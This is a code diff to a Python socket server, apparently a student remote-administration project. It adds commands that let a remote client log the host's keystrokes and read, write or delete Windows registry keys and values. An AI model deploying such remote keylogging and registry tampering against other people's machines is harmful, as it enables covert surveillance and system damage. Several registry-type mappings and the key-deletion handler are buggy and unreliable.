@@ -2,10 +2,18 @@ import socket
 import threading
 from pywinauto import *
 from pywinauto.keyboard import *
+from PIL import ImageTk, Image
 from mss import mss
 import os
 import wmi
 import signal
+import keyboard  # using module keyboard
+import tkinter
+from tkinter import *
+import concurrent.futures
+import winreg
+import win32gui
+import win32con
 
 # import time
 # import os
@@ -126,7 +134,184 @@ def handle_start(str_mes):
         return False
 
 
+global result
+global Flag
+
+
+def handle_keystroke():
+    global result
+    global Flag
+    Flag = True
+
+    list_keyboard = ['Escape', 'Space', 'BackSpace', 'Tab', 'Linefeed', 'Clear', 'Return', 'Pause', 'Scroll_Lock',
+                     'Sys_Req', 'Delete', 'Home', 'Left', 'Up', 'Right', 'Down', 'Page_Up', 'Page_Down',
+                     'End', 'Select', 'Print', 'Execute', 'Insert', 'Menu',
+                     'Help', 'Break', 'Num_Lock', 'Enter',
+
+                     'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12', 'F13',
+                     'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21',
+                     'F22', 'F23', 'F24',
+                     'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
+                     'U', 'V', 'W', 'X', 'Y', 'Z',
+                     '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
+                     '/', '`', '~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '[', ']', '{',
+                     '}', '|', ';', ':', '"', '/', '?', '.', '>', ',', '<']
+
+    str_full = []
+
+    while True:  # making a loop
+
+        # used try so that if user pressed other than the given key error will not be shown
+        try:
+            key = keyboard.read_key()
+            for char in list_keyboard:
+                # print(key, " == ", char.lower())
+                if key == char.lower():
+                    str_full.append(key)
+                    print(str_full)
+        except:
+            break
+
+        if keyboard.is_pressed('a'):
+            break
+        if not Flag:
+            break
+
+    print("RESULT: ")
+    print(str_full)
+
+    result = []
+    for i in range(0, len(str_full), 2):
+        result.append(str_full[i])
+
+    print(result)
+
+
+def handle_inphim():
+    global result
+    result.pop()
+    str_return = ''
+    for char in result:
+        if char != result[-1]:
+            str_return += (char + '|')
+        else:
+            str_return += char
+
+    return str_return
+
+
+def handle_unhook():
+    global Flag
+    Flag = False
+    send_keys('{ENTER}')
+
+
+def handle_getvalue(state, path, name):
+    try:
+        registry_key = winreg.OpenKey(state, path, 0,
+                                      winreg.KEY_READ)
+        value, regtype = winreg.QueryValueEx(registry_key, name)
+        winreg.CloseKey(registry_key)
+        return value
+    except WindowsError:
+        return None
+
+
+def handle_setvalue(state, path, name, value, type_INT):
+    try:
+        winreg.CreateKey(state, path)
+        registry_key = winreg.OpenKey(state, path, 0,
+                                      winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key, name, 0, type_INT, value)
+        winreg.CloseKey(registry_key)
+        return True
+    except WindowsError:
+        return False
+
+
+def handle_deletevalue(state, path, name):
+    try:
+        key = winreg.OpenKey(state, path, 0,
+                             winreg.KEY_ALL_ACCESS)
+        winreg.DeleteValue(key, name)
+        winreg.CloseKey(key)
+        win32gui.SendMessage(
+            win32con.HWND_BROADCAST, win32con.WM_SETTINGCHANGE, 0, 'Environment')
+        return True
+    except WindowsError:
+        return False
+
+
+def handle_createkey(state, path):
+    try:
+        winreg.CreateKey(state, path)
+
+        return True
+    except WindowsError:
+        return False
+
+
+def handle_deletekey(state, path):
+    try:
+        key = winreg.OpenKey(state, path, 0, winreg.KEY_ALL_ACCESS)
+        winreg.DeleteKey(key, 'Test1')
+        return True
+    except WindowsError:
+        return False
+
+
+def handle_registry(list_mes):
+    mode = list_mes[1]
+    path = list_mes[2]
+    name = list_mes[3]
+    value = list_mes[4]
+    datatype = list_mes[5]
+
+    subpath = path.split('\\', 1)
+    global state
+    if subpath[0] == 'HKEY_CURRENT_USER':
+        state = winreg.HKEY_CURRENT_USER
+    elif subpath[0] == 'HKEY_CLASSES_ROOT':
+        state = winreg.HKEY_CLASSES_ROOT
+    elif subpath[0] == 'HKEY_LOCAL_MACHINE':
+        state = winreg.HKEY_LOCAL_MACHINE
+    elif subpath[0] == 'HKEY_USERS':
+        state = winreg.HKEY_USERS
+    elif subpath[0] == 'HKEY_CURRENT_CONFIG':
+        state = winreg.HKEY_CURRENT_CONFIG
+
+    global type_INT
+    if datatype == 'STRING':
+        type_INT = winreg.REG_SZ
+    elif datatype == 'BINARY':
+        type_INT = winreg.REG_BINARY
+    elif datatype == 'DWORD':
+        type_INT = winreg.REG_DWORD
+    elif datatype == 'STRING':
+        type_INT = winreg.REG_SZ
+    elif datatype == 'QWORD':
+        type_INT = winreg.REG_DWORD
+    elif datatype == 'MUlTSTRING':
+        type_INT = winreg.REG_MULTI_SZ
+    elif datatype == 'EXSTRING':
+        type_INT = winreg.REG_EXPAND_SZ
+
+    if mode == "GETVALUE":
+        return handle_getvalue(state, subpath[1], name)
+    elif mode == "SETVALUE":
+        return handle_setvalue(state, subpath[1], name, value, type_INT)
+    elif mode == "DELETEVALUE":
+        return handle_deletevalue(state, subpath[1], name)
+    elif mode == "CREATEKEY":
+        return handle_createkey(state, subpath[1])
+    elif mode == "DELETEKEY":
+        return handle_deletekey(state, subpath[1])
+
+
+
+
 def handle_client(conn, addr):
+    global Flag
     print(f"[NEW CONNECTION] {addr} connected ")
     connected = True
 
@@ -152,6 +337,22 @@ def handle_client(conn, addr):
                 send_process(conn, str(handle_kill(list_mes[1])))
             elif list_mes[0] == "START":
                 send_process(conn, str(handle_start(list_mes[1])))
+            elif list_mes[0] == "KEYSTROKE":
+                thread = threading.Thread(target=handle_keystroke)
+                thread.start()
+            elif list_mes[0] == "INPHIM":
+                # ------------
+                handle_unhook()
+                # ------------
+                send_process(conn, str(handle_inphim()))
+                # -----------------
+                thread = threading.Thread(target=handle_keystroke)
+                thread.start()
+
+            elif list_mes[0] == "UNHOOK":
+                handle_unhook()
+            elif list_mes[0] == "REGISTRY":
+                send_process(conn, str(handle_registry(list_mes)))
 
     conn.close()
 
@@ -168,4 +369,35 @@ def start_process():
 
 print("[SERVER] is starting . .  .")
 
-start_process()
+# start_process()
+global Flag
+Flag = False
+
+
+def turn_on():
+    thread = threading.Thread(target=start_process)
+    thread.start()
+
+
+class App(threading.Thread):
+
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.start()
+
+    def callback(self):
+        self.root.quit()
+
+    def run(self):
+        self.root = Tk()
+        self.root.protocol("WM_DELETE_WINDOW", self.callback)
+
+        button_start = Button(self.root, text="Start", comman=turn_on)
+        button_start.pack()
+
+        self.root.mainloop()
+
+
+app = App()
+print('Now we can continue running code while mainloop runs!')
+print("=")
